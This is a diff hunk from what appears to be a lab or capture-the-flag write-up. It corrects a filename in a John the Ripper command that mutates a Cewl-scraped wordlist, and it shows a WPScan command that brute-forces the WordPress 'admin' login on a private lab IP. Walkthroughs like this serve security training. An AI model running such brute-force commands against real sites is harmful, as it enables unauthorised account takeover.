@@ -52,7 +52,7 @@ Trying some WPScan Brute Force, I scraped the site with Cewl:
 
 Then ran it through some mutations with John The Ripper:
 
-`john --wordlist=/root/lazycewl --rules --stdout > lazymutate.txt`
+`john --wordlist=/root/lazycewl.txt --rules --stdout > lazymutate.txt`
 
 `wpscan –u http://192.168.17.139/wordpress –wordlist lazymutate.txt –username admin`
 
